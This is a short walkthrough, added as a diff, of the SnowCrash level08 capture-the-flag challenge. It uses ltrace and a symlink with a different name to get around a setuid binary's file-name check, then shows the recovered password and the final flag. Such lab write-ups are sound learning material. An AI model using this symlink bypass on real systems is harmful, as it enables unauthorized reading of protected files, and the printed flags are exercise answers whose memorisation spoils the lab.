@@ -1,0 +1,34 @@
+Here we have a token file and a execute file.
+Executable file run with flag08 perm.
+Token file need flag08 perm for reading.
+
+Go analyze the exectuable file with token.
+
+level08@SnowCrash:~$ ltrace ./level08 
+__libc_start_main(0x8048554, 1, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
+printf("%s [file to read]\n", "./level08"./level08 [file to read]
+)                              = 25
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+level08@SnowCrash:~$ ltrace ./level08 token
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                                                = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)                            = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++
+
+With it, we understand that a name of file witch product "You may not access" erreur message.
+So let's create link file of token with another name.
+
+level08@SnowCrash:/tmp$ ln -s ~/token link
+level08@SnowCrash:~$ ./level08 /tmp/link
+quif5eloekouj29ke0vouxean
+
+This is password of flag08
+
+level08@SnowCrash:~$ su flag08
+Password: 
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
